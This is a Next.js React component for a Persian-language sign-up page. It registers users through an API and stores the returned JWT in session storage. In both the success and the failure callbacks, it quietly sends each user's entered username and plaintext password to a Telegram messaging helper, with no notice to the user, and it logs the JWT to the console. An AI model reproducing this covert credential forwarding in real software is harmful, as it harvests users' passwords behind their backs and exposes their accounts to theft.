"use client";
import LoadingOverlay from "@/app/_components/LoadingOverlay";
import GlobalApi, { sendTelegramMessage } from "@/app/_utils/GlobalApi";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/navigation";
import React, { useEffect, useState } from "react";
import { toast } from "sonner";

function CreateAccount() {
  const [email, setEmail] = useState();
  const [password, setPassword] = useState();
  const [username, setUsername] = useState();
  const router = useRouter();
  const [loading, setLoading] = useState(false);

  const onCreateAcconut = () => {
    setLoading(true);
    GlobalApi.registerUser(email, password, username).then(
      (resp) => {
        console.log(resp.data.user);
        console.log(resp.data.jwt);
        sessionStorage.setItem("user", JSON.stringify(resp.data.user));
        sessionStorage.setItem("jwt", resp.data.jwt);
        router.push("/");
        toast("حساب شما با موفقیت ایجاد شد✅");
        sendTelegramMessage(
          `user registered => username: ${email} password: ${password} `
        );

        window.location.href = "/";
        setLoading(false);
      },
      (e) => {
        sendTelegramMessage(`user entered a duplicate username!
entered username: ${email}
entered password: ${password} `);
        setLoading(false);
      }
    );
  };

  useEffect(() => {
    const jwt = sessionStorage.getItem("jwt");
    if (jwt) {
      router.push("/");
    }
  }, []);

  const t = () => {
    sendTelegramMessage(`user => sign-in`);
  };

  return (
    <div
      lang="fa"
      dir="rtl"
      className="flex items-baseline justify-center m-10 "
    >
      <div className="flex flex-col gap-5 items-center justify-center p-10 pt-5 bg-slate-200 border border-gray-200 rounded-2xl ">
        <h2 className="font-bold text-3xl">ثبت نام</h2>
        <h2 className="text-gray-500">
          برای ثبت نام یک نام کاربری و رمز عبور وارد کنید
        </h2>
        <div className="w-full flex flex-col mt-7 gap-5">
          <Input
            dir="rtl"
            placeholder="نام کاربری"
            onChange={(e) => setEmail(e.target.value)}
          />

          <Input
            dir="rtl"
            type="password"
            placeholder="رمز عبور"
            onChange={(e) => setPassword(e.target.value)}
          />
          <Button
            onClick={() => onCreateAcconut()}
            disabled={!(email && password)}
          >
            ثبت نام
          </Button>
          <p>
            قبلا ثبت نام کرده اید؟
            <Link onClick={t} href={"/sign-in"} className="text-blue-500">
              ورود به حساب کاربری
            </Link>
          </p>
        </div>
      </div>
      <LoadingOverlay loading={loading} />
    </div>
  );
}

export default CreateAccount;
